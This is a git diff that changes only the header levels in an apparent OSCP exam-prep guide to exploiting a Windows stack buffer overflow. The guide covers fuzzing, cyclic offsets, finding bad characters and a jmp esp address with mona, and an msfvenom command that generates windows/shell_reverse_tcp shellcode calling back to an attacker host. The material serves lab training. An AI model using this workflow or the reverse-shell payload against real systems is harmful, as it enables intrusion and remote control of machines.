@@ -7,43 +7,43 @@ After passing OSCP, various people have asked about my process for the buffer ov
 
 -------
 
-### 1. Start Immunity/app as administrator
+#### 1. Start Immunity/app as administrator
 
-### 2. Confirm connectivity from attack host
+#### 2. Confirm connectivity from attack host
 ```
 nc xxx.xxx.xxx.xxx <port>
 ```
 
-### 3. Fuzz for crash (See fuzzer template)
+#### 3. Fuzz for crash (See fuzzer template)
 ```
 [root@kali:/r/bof]# python3 fuzzer.py
 ```
 
-### 4. Generate cyclic pattern to find exact crash
+#### 4. Generate cyclic pattern to find exact crash
 ```
 [root@kali:/r/bof]# cyclic 300
 aaaabaaacaaadaaaeaa [ .. snip .. ] afaaagaaahaaaiaaa
 ```
 
-### 5. Add pattern to "overflow" in exploit.py and repro crash
+#### 5. Add pattern to "overflow" in exploit.py and repro crash
 
-### 6. Get offset from address in EIP and set "offset"
+#### 6. Get offset from address in EIP and set "offset"
 Get address in EIP and find number of bytes to EIP:
 ```
 [root@kali:/r/bof]# cyclic -l 0x61616275
 2003
 ```
 
-### 7. Remove cyclic pattern from "overflow" and replace with "A" * offset
+#### 7. Remove cyclic pattern from "overflow" and replace with "A" * offset
 ```
 offset = 634 # EIP @ 0x616A6761
 overflow = b"A" * offset
 eip = b"BBBB" # 
 ```
 
-### 8. Replicate crash and confirm "B" in EIP
+#### 8. Replicate crash and confirm "B" in EIP
 
-### 9. Find Bad Characters with mona
+#### 9. Find Bad Characters with mona
 - Set working dir:
 `!mona config -set workingfolder C:\Windows\Temp`
 - Create bytearray (without bad chars we know about)
@@ -58,25 +58,25 @@ badchars = [0x00] # start with null
 - Note new bad char, add it to "badchars"
 - Repeat steps until no new bad chars are reported
 
-### 10. Find Jump Point using bad chars (running or crashed) - will be in "Log Data" window
+#### 10. Find Jump Point using bad chars (running or crashed) - will be in "Log Data" window
 ```
 !mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
 ```
 
-### 11. Put jmp address in "eip" var backwards (little endian)
+#### 11. Put jmp address in "eip" var backwards (little endian)
 ```
 eip = b"\xfa\x11\x50\x62" # 625011AF
 ```
 
-### 12. Generate shellcode without bad chars and add as "sc" var
+#### 12. Generate shellcode without bad chars and add as "sc" var
 ```
 [root@kali:/r/bof]# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.230 LPORT=6666 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f python -v sc
 ```
 
-### 13. Add shellcode
+#### 13. Add shellcode
 
-### 14. Add NOPs as needed and comment out "charpayload"
+#### 14. Add NOPs as needed and comment out "charpayload"
 ```
 padding = b"\x90" * 16
 ```
-### 15. Get shell 
+#### 15. Get shell 
